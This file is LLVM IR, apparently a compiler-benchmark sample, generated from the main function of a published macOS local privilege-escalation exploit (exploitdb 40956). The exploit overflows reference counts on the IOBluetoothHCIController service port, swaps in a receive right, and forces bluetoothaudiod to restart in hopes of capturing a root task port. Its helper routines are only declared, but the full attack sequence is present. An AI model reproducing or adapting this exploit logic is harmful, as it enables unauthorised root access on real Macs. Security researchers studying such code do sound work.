; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/local/extr_40956.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/local/extr_40956.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i32, i32, i32, i32 }
%struct.TYPE_5__ = type { %struct.TYPE_4__, i32 }

@self = common dso_local global i32 0, align 4
@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"IOBluetoothHCIController\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"%d : 0x%x\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@MACH_MSG_TYPE_COPY_SEND = common dso_local global i32 0, align 4
@MACH_SEND_MSG = common dso_local global i32 0, align 4
@MACH_MSG_OPTION_NONE = common dso_local global i32 0, align 4
@MACH_MSG_TIMEOUT_NONE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [19 x i8] c"sending probe: %s\0A\00", align 1
@MACH_RCV_MSG = common dso_local global i32 0, align 4
@MACH_RCV_TIMEOUT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [23 x i8] c"got the probe message\0A\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"trying again (%d)\0A\00", align 1
@.str.5 = private unnamed_addr constant [84 x i8] c"worked? - forcing a root process to restart, hopefully will send us its task port!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.TYPE_4__, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.TYPE_5__, align 4
  store i32 0, i32* %1, align 4
  %10 = call i32 (...) @mach_task_self()
  store i32 %10, i32* @self, align 4
  %11 = load i32, i32* @kIOMasterPortDefault, align 4
  %12 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  %13 = call i32 @IOServiceGetMatchingService(i32 %11, i32 %12)
  store i32 %13, i32* %2, align 4
  %14 = call i32 (...) @getpid()
  %15 = load i32, i32* %2, align 4
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i32 %14, i32 %15)
  store i64 40, i64* %3, align 8
  %17 = load i32, i32* %2, align 4
  %18 = load i64, i64* %3, align 8
  %19 = sub nsw i64 4294967296, %18
  %20 = call i32 @leak_n_refs(i32 %17, i64 %19)
  %21 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %21, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %22

22:                                               ; preds = %67, %0
  %23 = load i64, i64* %5, align 8
  %24 = load i64, i64* %3, align 8
  %25 = icmp slt i64 %23, %24
  br i1 %25, label %26, label %70

26:                                               ; preds = %22
  %27 = load i32, i32* %2, align 4
  %28 = call i32 @inc_and_dec_ref(i32 %27)
  %29 = call i32 (...) @replace_with_receive()
  store i32 %29, i32* %6, align 4
  %30 = bitcast %struct.TYPE_4__* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %30, i8 0, i64 20, i1 false)
  %31 = load i32, i32* @MACH_MSG_TYPE_COPY_SEND, align 4
  %32 = call i32 @MACH_MSGH_BITS(i32 %31, i32 0)
  %33 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 3
  store i32 %32, i32* %33, align 4
  %34 = load i32, i32* %2, align 4
  %35 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 0
  store i32 %34, i32* %35, align 4
  %36 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 1
  store i32 1094795585, i32* %36, align 4
  %37 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 2
  store i32 20, i32* %37, align 4
  %38 = load i32, i32* @MACH_SEND_MSG, align 4
  %39 = load i32, i32* @MACH_MSG_OPTION_NONE, align 4
  %40 = or i32 %38, %39
  %41 = load i32, i32* @MACH_PORT_NULL, align 4
  %42 = load i32, i32* @MACH_MSG_TIMEOUT_NONE, align 4
  %43 = load i32, i32* @MACH_PORT_NULL, align 4
  %44 = call i32 @mach_msg(%struct.TYPE_4__* %7, i32 %40, i32 20, i32 0, i32 %41, i32 %42, i32 %43)
  store i32 %44, i32* %8, align 4
  %45 = load i32, i32* %8, align 4
  %46 = call i8* @mach_error_string(i32 %45)
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0), i8* %46)
  %48 = bitcast %struct.TYPE_5__* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %48, i8 0, i64 24, i1 false)
  %49 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %9, i32 0, i32 0
  %50 = load i32, i32* @MACH_RCV_MSG, align 4
  %51 = load i32, i32* @MACH_RCV_TIMEOUT, align 4
  %52 = or i32 %50, %51
  %53 = load i32, i32* %6, align 4
  %54 = call i32 @mach_msg(%struct.TYPE_4__* %49, i32 %52, i32 0, i32 24, i32 %53, i32 1, i32 0)
  %55 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %9, i32 0, i32 0
  %56 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %55, i32 0, i32 1
  %57 = load i32, i32* %56, align 4
  %58 = icmp eq i32 %57, 1094795585
  br i1 %58, label %59, label %62

59:                                               ; preds = %26
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %61 = load i32, i32* %6, align 4
  store i32 %61, i32* %4, align 4
  br label %70

62:                                               ; preds = %26
  %63 = load i64, i64* %5, align 8
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0), i64 %63)
  %65 = load i32, i32* %2, align 4
  %66 = call i32 @leak_one_ref(i32 %65)
  br label %67

67:                                               ; preds = %62
  %68 = load i64, i64* %5, align 8
  %69 = add nsw i64 %68, 1
  store i64 %69, i64* %5, align 8
  br label %22

70:                                               ; preds = %59, %22
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.5, i64 0, i64 0))
  %72 = call i32 (...) @force_bluetoothaudiod_restart()
  %73 = load i32, i32* %4, align 4
  %74 = call i32 @service_requests(i32 %73)
  ret i32 0
}

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @leak_n_refs(i32, i64) #1

declare dso_local i32 @inc_and_dec_ref(i32) #1

declare dso_local i32 @replace_with_receive(...) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i32 @MACH_MSGH_BITS(i32, i32) #1

declare dso_local i32 @mach_msg(%struct.TYPE_4__*, i32, i32, i32, i32, i32, i32) #1

declare dso_local i8* @mach_error_string(i32) #1

declare dso_local i32 @leak_one_ref(i32) #1

declare dso_local i32 @force_bluetoothaudiod_restart(...) #1

declare dso_local i32 @service_requests(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
